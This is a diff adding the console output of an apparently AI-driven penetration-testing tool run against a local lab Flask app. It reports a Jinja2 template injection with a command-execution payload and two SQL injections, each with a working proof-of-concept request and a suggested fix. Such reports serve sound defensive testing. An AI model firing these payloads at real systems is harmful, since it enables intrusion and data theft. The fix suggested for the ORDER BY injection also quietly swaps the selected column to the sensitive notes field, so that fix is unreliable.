@@ -1,0 +1,226 @@
+
+
+╭─ STRIX ──────────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Penetration test initiated                                                  │
+│                                                                              │
+│  Target  /tmp/test-vuln-hard                                                 │
+│  Output  strix_runs/test-vuln-hard_671a                                      │
+│                                                                              │
+│  Vulnerabilities will be displayed in real-time.                             │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+
+╭─ VULN-0001 ──────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Vulnerability Report                                                        │
+│                                                                              │
+│  Title: Server-Side Template Injection (SSTI) leading to RCE in /render      │
+│                                                                              │
+│  Severity: CRITICAL                                                          │
+│                                                                              │
+│  CVSS Score: 9.8                                                             │
+│                                                                              │
+│  Target: http://127.0.0.1:8098/render                                        │
+│                                                                              │
+│  Endpoint: /render                                                           │
+│                                                                              │
+│  Method: POST                                                                │
+│                                                                              │
+│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H                            │
+│                                                                              │
+│  Description                                                                 │
+│  Server-Side Template Injection (SSTI) in the `/render` endpoint allows      │
+│  unauthenticated remote code execution via the `tpl` form parameter.         │
+│                                                                              │
+│  Impact                                                                      │
+│  Arbitrary remote code execution on the server hosting the Flask             │
+│  application, leading to full system compromise.                             │
+│                                                                              │
+│  Technical Analysis                                                          │
+│  The `/render` endpoint retrieves the `tpl` form parameter without any       │
+│  validation or sanitization and passes it directly to Flask's                │
+│  `render_template_string()`. Since Jinja2 evaluates expressions within `{{   │
+│  }}`, an attacker can traverse the object graph via                          │
+│  `config.__class__.__init__.__globals__` to access Python builtins or        │
+│  modules like `os`, enabling arbitrary command execution.                    │
+│                                                                              │
+│  PoC Description                                                             │
+│  1. Send a POST request to `/render` with the form parameter                 │
+│  `tpl={{config.__class__.__init__.__globals__['os'].popen('id').read()}}`.\  │
+│  n2. Observe command execution output in the HTTP response.                  │
+│                                                                              │
+│  PoC Code                                                                    │
+│  import requests                                                             │
+│                                                                              │
+│  resp = requests.post("http://127.0.0.1:8098/render", data={"tpl":           │
+│  "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"})      │
+│  print(resp.text)                                                            │
+│                                                                              │
+│  Code Locations                                                              │
+│                                                                              │
+│    Location 1: app.py:47-52                                                  │
+│    Sanitize or use safe template rendering                                   │
+│    Fix:                                                                      │
+│    - @app.route(\"/render\", methods=[\"POST\"])\ndef render():\n    # (3)   │
+│  SSTI via a POST form field (not a query string)\n    tpl =                  │
+│  request.form.get(\"tpl\", \"hello\")\n    return                            │
+│  render_template_string(tpl)                                                 │
+│    + @app.route(\"/render\", methods=[\"POST\"])\ndef render():\n    #       │
+│  Secure: pass template input as context variables instead of evaluating it   │
+│  as a template string\n    tpl_name = request.form.get(\"tpl\",              │
+│  \"hello\")\n    return render_template_string(\"Hello {{ name }}\",         │
+│  name=tpl_name)                                                              │
+│                                                                              │
+│  Remediation                                                                 │
+│  Avoid passing raw user input directly to `render_template_string`.          │
+│  Instead, pass user input as context variables to a predefined template      │
+│  string or use safe rendering mechanisms.                                    │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+╭─ VULN-0002 ──────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Vulnerability Report                                                        │
+│                                                                              │
+│  Title: SQL Injection in GET /orders sort parameter                          │
+│                                                                              │
+│  Severity: HIGH                                                              │
+│                                                                              │
+│  CVSS Score: 7.5                                                             │
+│                                                                              │
+│  Target: http://127.0.0.1:8098/orders                                        │
+│                                                                              │
+│  Endpoint: /orders                                                           │
+│                                                                              │
+│  Method: GET                                                                 │
+│                                                                              │
+│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                            │
+│                                                                              │
+│  Description                                                                 │
+│  The GET /orders endpoint directly interpolates the 'sort' query parameter   │
+│  into an SQL ORDER BY clause without sanitization or parameterization,       │
+│  allowing boolean-based blind SQL injection and data exfiltration.           │
+│                                                                              │
+│  Impact                                                                      │
+│  Allows an attacker to infer sensitive database contents (such as flags and  │
+│  notes) using boolean-based blind SQL injection.                             │
+│                                                                              │
+│  Technical Analysis                                                          │
+│  The application takes request.args.get("sort") and interpolates it          │
+│  directly into an f-string for the ORDER BY clause. Since SQL                │
+│  parameterization cannot be used for column names or clauses, an allowlist   │
+│  must be enforced.                                                           │
+│                                                                              │
+│  PoC Description                                                             │
+│  1. Send GET request to /orders with a sort parameter containing a           │
+│  conditional CASE statement.                                                 │
+│  2. Observe different result rows ordering based on the boolean condition.   │
+│                                                                              │
+│  PoC Code                                                                    │
+│  import requests                                                             │
+│  r = requests.get('http://127.0.0.1:8098/orders', params={'sort':'(CASE      │
+│  WHEN (substr((SELECT note FROM orders WHERE id=1),1,1)=\\'f\\') THEN id     │
+│  ELSE qty END)'})                                                            │
+│  print(r.text)                                                               │
+│                                                                              │
+│  Code Locations                                                              │
+│                                                                              │
+│    Location 1: app.py:23-27                                                  │
+│    Allowlist sort parameter                                                  │
+│    Fix:                                                                      │
+│    -     sort = request.args.get(\"sort\", \"id\")                           │
+│      conn = sqlite3.connect(DB)                                              │
+│      rows = conn.execute(f\"SELECT id, sku, qty FROM orders ORDER BY         │
+│  {sort}\").fetchall()                                                        │
+│    +     sort = request.args.get(\"sort\", \"id\")                           │
+│      if sort not in [\"id\", \"sku\", \"qty\"]:                              │
+│          sort = \"id\"                                                       │
+│      conn = sqlite3.connect(DB)                                              │
+│      rows = conn.execute(f\"SELECT id, sku, note FROM orders ORDER BY        │
+│  {sort}\").fetchall()                                                        │
+│                                                                              │
+│  Remediation                                                                 │
+│  Restrict the 'sort' parameter to a hardcoded allowlist of permitted column  │
+│  names.                                                                      │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+╭─ VULN-0003 ──────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Vulnerability Report                                                        │
+│                                                                              │
+│  Title: SQL Injection in POST /orders/by-sku sku parameter                   │
+│                                                                              │
+│  Severity: CRITICAL                                                          │
+│                                                                              │
+│  CVSS Score: 9.1                                                             │
+│                                                                              │
+│  Target: http://127.0.0.1:8098/orders/by-sku                                 │
+│                                                                              │
+│  Endpoint: /orders/by-sku                                                    │
+│                                                                              │
+│  Method: POST                                                                │
+│                                                                              │
+│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N                            │
+│                                                                              │
+│  Description                                                                 │
+│  The POST /orders/by-sku endpoint directly interpolates the JSON 'sku'       │
+│  parameter into an SQL WHERE clause without parameterization, enabling SQL   │
+│  injection and full data exfiltration.                                       │
+│                                                                              │
+│  Impact                                                                      │
+│  Allows unauthorized extraction of all database records, including           │
+│  sensitive notes and flags.                                                  │
+│                                                                              │
+│  Technical Analysis                                                          │
+│  The endpoint formats the `sku` variable directly into an SQL query string,  │
+│  allowing breakout from the single quotes and injection of arbitrary SQL     │
+│  statements.                                                                 │
+│                                                                              │
+│  PoC Description                                                             │
+│  1. Send POST request to /orders/by-sku with JSON body `{"sku": "' OR 1=1    │
+│  --"}`.                                                                      │
+│  2. Observe all records returned in the response.                            │
+│                                                                              │
+│  PoC Code                                                                    │
+│  import requests                                                             │
+│  r = requests.post('http://127.0.0.1:8098/orders/by-sku', json={'sku': \"'   │
+│  OR 1=1 --\"})                                                               │
+│  print(r.text)                                                               │
+│                                                                              │
+│  Code Locations                                                              │
+│                                                                              │
+│    Location 1: app.py:31-35                                                  │
+│    Use parameterized query for sku                                           │
+│    Fix:                                                                      │
+│    -     body = request.get_json(force=True, silent=True) or {}              │
+│      sku = body.get(\"sku\", \"alpha\")                                      │
+│      conn = sqlite3.connect(DB)                                              │
+│      rows = conn.execute(f\"SELECT id, sku, note FROM orders WHERE sku =     │
+│  '{sku}'\").fetchall()                                                       │
+│    +     body = request.get_json(force=True, silent=True) or {}              │
+│      sku = body.get(\"sku\", \"alpha\")                                      │
+│      conn = sqlite3.connect(DB)                                              │
+│      rows = conn.execute(\"SELECT id, sku, note FROM orders WHERE sku =      │
+│  ?\", (sku,)).fetchall()                                                     │
+│                                                                              │
+│  Remediation                                                                 │
+│  Use parameterized SQL queries instead of string formatting for user         │
+│  inputs.                                                                     │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+╭─ STRIX ──────────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Penetration test in progress                                                │
+│                                                                              │
+│  Model openai/gemini-flash-lite                                              │
+│  Vulnerabilities 3                                                           │
+│  CRITICAL: 2 | HIGH: 1                                                       │
+│                                                                              │
+│  Input Tokens 9.0M  ·  Cached Tokens 6.7M                                    │
+│  Output Tokens 25.4K  ·  Cost $0.0000                                        │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
